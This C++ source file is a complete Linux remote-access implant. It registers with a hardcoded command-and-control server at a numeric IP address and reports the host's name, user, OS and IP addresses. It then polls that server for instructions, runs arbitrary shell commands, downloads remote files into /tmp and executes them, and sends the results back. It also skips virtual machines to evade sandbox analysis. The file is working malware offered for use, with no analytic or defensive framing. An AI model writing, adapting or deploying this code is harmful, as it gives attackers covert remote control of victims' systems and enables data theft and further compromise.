#include <iostream>
#include <string>
#include <map>
#include <mutex>
#include <thread>
#include <chrono>
#include <sstream>
#include <algorithm>
#include <vector>
#include <random>
#include <iomanip>
#include <cstring>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <ifaddrs.h>
#include <sys/utsname.h>
#include <sys/sysinfo.h>
#include <curl/curl.h>
#include <json/json.h>

// --- Configuration ---
const char* C2_SERVER = "http://150.136.130.59:3002"; // Your C2 server URL
const char* AGENT_ID = nullptr; // Will be generated on first run
const int HEARTBEAT_INTERVAL = 30000; // 30 seconds
const int COMMAND_CHECK_INTERVAL = 5000; // 5 seconds

// --- Global Variables ---
std::string g_agentId;
std::string g_hostname;
std::string g_username;
std::string g_osInfo;
std::string g_ipAddress;
bool g_running = true;
std::mutex g_mutex;

// --- Utility Functions ---

// Generate random agent ID
std::string generateAgentId() {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, 15);
    
    const char* hex = "0123456789abcdef";
    std::string id;
    for (int i = 0; i < 32; ++i) {
        id += hex[dis(gen)];
    }
    return id;
}

// Get system information
std::string getSystemInfo() {
    struct utsname uts;
    struct sysinfo si;
    
    if (uname(&uts) != 0) {
        return "Unknown system";
    }
    
    if (sysinfo(&si) != 0) {
        return "Unknown system";
    }
    
    std::ostringstream oss;
    oss << uts.sysname << " " << uts.release;
    oss << " | CPU: " << si.procs << " cores";
    oss << " | RAM: " << (si.totalram / (1024 * 1024 * 1024)) << "GB";
    
    return oss.str();
}

// Get IP addresses
std::string getIpAddresses() {
    std::string output;
    struct ifaddrs *ifaddr, *ifa;
    
    if (getifaddrs(&ifaddr) == -1) {
        return "127.0.0.1";
    }
    
    for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr == NULL) continue;
        
        if (ifa->ifa_addr->sa_family == AF_INET) {
            char ip[INET_ADDRSTRLEN];
            struct sockaddr_in *addr = (struct sockaddr_in*)ifa->ifa_addr;
            inet_ntop(AF_INET, &(addr->sin_addr), ip, INET_ADDRSTRLEN);
            
            // Skip loopback and down interfaces
            if (strcmp(ip, "127.0.0.1") != 0 && (ifa->ifa_flags & IFF_UP)) {
                output += std::string(ip) + " ";
            }
        }
    }
    
    freeifaddrs(ifaddr);
    return output.empty() ? "127.0.0.1" : output;
}

// CURL write callback
size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* userp) {
    userp->append((char*)contents, size * nmemb);
    return size * nmemb;
}

// HTTP request helper
std::string httpRequest(const std::string& method, const std::string& url, const std::string& data = "", const std::map<std::string, std::string>& headers = {}) {
    CURL* curl = curl_easy_init();
    std::string response;
    
    if (!curl) {
        return "Failed to initialize CURL";
    }
    
    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 30L);
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    
    if (method == "POST") {
        curl_easy_setopt(curl, CURLOPT_POST, 1L);
        if (!data.empty()) {
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data.c_str());
        }
    }
    
    // Add headers
    struct curl_slist* headerList = NULL;
    headerList = curl_slist_append(headerList, "Content-Type: application/json");
    for (const auto& header : headers) {
        std::string headerStr = header.first + ": " + header.second;
        headerList = curl_slist_append(headerList, headerStr.c_str());
    }
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headerList);
    
    CURLcode res = curl_easy_perform(curl);
    
    curl_slist_free_all(headerList);
    curl_easy_cleanup(curl);
    
    if (res != CURLE_OK) {
        return "CURL request failed: " + std::string(curl_easy_strerror(res));
    }
    
    return response;
}

// Register agent with C2 server
bool registerAgent() {
    Json::Value payload;
    payload["agent_id"] = g_agentId;
    payload["hostname"] = g_hostname;
    payload["username"] = g_username;
    payload["os_info"] = g_osInfo;
    payload["ip_address"] = g_ipAddress;
    
    Json::FastWriter writer;
    std::string jsonData = writer.write(payload);
    
    std::string response = httpRequest("POST", std::string(C2_SERVER) + "/api/c2/register", jsonData);
    return response.find("success") != std::string::npos;
}

// Get pending commands from C2 server
std::vector<std::map<std::string, std::string>> getCommands() {
    std::vector<std::map<std::string, std::string>> commands;
    
    std::string url = std::string(C2_SERVER) + "/api/c2/commands/" + g_agentId;
    std::string response = httpRequest("GET", url);
    
    Json::Value root;
    Json::Reader reader;
    
    if (reader.parse(response, root)) {
        if (root.isMember("commands") && root["commands"].isArray()) {
            const Json::Value& commandsArray = root["commands"];
            for (const auto& cmd : commandsArray) {
                std::map<std::string, std::string> command;
                command["id"] = cmd["id"].asString();
                command["command_type"] = cmd["command_type"].asString();
                command["command_data"] = cmd["command_data"].asString();
                command["created_at"] = cmd["created_at"].asString();
                commands.push_back(command);
            }
        }
    }
    
    return commands;
}

// Submit command result to C2 server
bool submitResult(const std::string& commandId, const std::string& resultData, bool success, const std::string& errorMessage = "") {
    Json::Value payload;
    payload["command_id"] = std::stoi(commandId);
    payload["agent_id"] = g_agentId;
    payload["result_data"] = resultData;
    payload["success"] = success;
    if (!errorMessage.empty()) {
        payload["error_message"] = errorMessage;
    }
    
    Json::FastWriter writer;
    std::string jsonData = writer.write(payload);
    
    std::string response = httpRequest("POST", std::string(C2_SERVER) + "/api/c2/result", jsonData);
    return response.find("success") != std::string::npos;
}

// Execute shell command
std::string executeCommand(const std::string& command) {
    std::string output;
    FILE* pipe = popen(command.c_str(), "r");
    
    if (!pipe) {
        return "Failed to execute command";
    }
    
    char buffer[4096];
    while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
        output += buffer;
    }
    
    pclose(pipe);
    return output.empty() ? "Command produced no output." : output;
}

// Download and execute file from URL
std::string downloadAndExecute(const std::string& url) {
    std::string content = httpRequest("GET", url);
    
    if (content.find("Failed") == 0) {
        return content;
    }
    
    // Create temporary file
    char tempFilename[256];
    sprintf(tempFilename, "/tmp/file_%u", (unsigned int)time(NULL));
    
    // Write content to file
    FILE* fp = fopen(tempFilename, "wb");
    if (!fp) {
        return "Failed to create file: " + std::string(tempFilename);
    }
    
    fwrite(content.c_str(), 1, content.length(), fp);
    fclose(fp);
    
    // Make executable
    chmod(tempFilename, 0755);
    
    // Execute file
    std::string cmd = std::string(tempFilename) + " &";
    system(cmd.c_str());
    
    return "File downloaded and executed: " + std::string(tempFilename);
}

// Anti-VM checks (Linux version)
bool isVirtualMachine() {
    // Check for common VM indicators in /proc/cpuinfo
    FILE* fp = fopen("/proc/cpuinfo", "r");
    if (fp) {
        char line[256];
        while (fgets(line, sizeof(line), fp)) {
            std::string cpuInfo(line);
            std::transform(cpuInfo.begin(), cpuInfo.end(), cpuInfo.begin(), ::tolower);
            
            // Check for VM vendors
            if (cpuInfo.find("vmware") != std::string::npos ||
                cpuInfo.find("virtualbox") != std::string::npos ||
                cpuInfo.find("qemu") != std::string::npos ||
                cpuInfo.find("xen") != std::string::npos) {
                fclose(fp);
                return true;
            }
        }
        fclose(fp);
    }
    
    // Check for VM processes
    const char* vmProcs[] = {
        "vmtoolsd", "vboxservice", "qemu-ga", "xenbus"
    };
    
    for (const auto& proc : vmProcs) {
        std::string cmd = "pgrep " + std::string(proc) + " >/dev/null 2>&1";
        if (system(cmd.c_str()) == 0) {
            return true;
        }
    }
    
    // Check hardware specs
    struct sysinfo si;
    if (sysinfo(&si) == 0) {
        if (si.procs <= 4 || si.totalram <= (4ULL * 1024 * 1024 * 1024)) {
            return true;
        }
    }
    
    return false;
}

// Main agent loop
void agentLoop() {
    while (g_running) {
        try {
            // Get pending commands
            auto commands = getCommands();
            
            for (const auto& command : commands) {
                std::string commandId = command.at("id");
                std::string commandType = command.at("command_type");
                std::string commandData = command.at("command_data");
                
                std::string result;
                bool success = true;
                std::string errorMessage;
                
                try {
                    if (commandType == "shell") {
                        result = executeCommand(commandData);
                    } else if (commandType == "download") {
                        result = downloadAndExecute(commandData);
                    } else {
                        result = "Unsupported command type: " + commandType;
                        success = false;
                        errorMessage = "Command type not implemented";
                    }
                } catch (const std::exception& e) {
                    result = "Command execution failed";
                    success = false;
                    errorMessage = e.what();
                }
                
                // Submit result
                submitResult(commandId, result, success, errorMessage);
            }
            
            usleep(COMMAND_CHECK_INTERVAL * 1000);
        } catch (const std::exception& e) {
            // Log error and continue
            usleep(COMMAND_CHECK_INTERVAL * 1000);
        }
    }
}

// Heartbeat loop
void heartbeatLoop() {
    while (g_running) {
        try {
            registerAgent();
            usleep(HEARTBEAT_INTERVAL * 1000);
        } catch (const std::exception& e) {
            usleep(HEARTBEAT_INTERVAL * 1000);
        }
    }
}

// Signal handler
void signalHandler(int signum) {
    g_running = false;
}

int main() {
    // Anti-VM check
    if (isVirtualMachine()) {
        return 0;
    }
    
    // Initialize CURL
    curl_global_init(CURL_GLOBAL_ALL);
    
    // Set up signal handler
    signal(SIGINT, signalHandler);
    signal(SIGTERM, signalHandler);
    
    // Generate agent ID if not set
    if (!AGENT_ID) {
        g_agentId = generateAgentId();
    } else {
        g_agentId = AGENT_ID;
    }
    
    // Get system information
    char hostname[256];
    char username[256];
    
    if (gethostname(hostname, sizeof(hostname)) != 0) {
        strcpy(hostname, "unknown");
    }
    
    if (getlogin_r(username, sizeof(username)) != 0) {
        strcpy(username, "unknown");
    }
    
    g_hostname = hostname;
    g_username = username;
    g_osInfo = getSystemInfo();
    g_ipAddress = getIpAddresses();
    
    // Register with C2 server
    if (!registerAgent()) {
        // If registration fails, try again after a delay
        sleep(5);
        if (!registerAgent()) {
            curl_global_cleanup();
            return 1;
        }
    }
    
    // Start agent and heartbeat threads
    std::thread agentThread(agentLoop);
    std::thread heartbeatThread(heartbeatLoop);
    
    // Wait for threads to finish
    if (agentThread.joinable()) agentThread.join();
    if (heartbeatThread.joinable()) heartbeatThread.join();
    
    // Cleanup
    curl_global_cleanup();
    return 0;
} 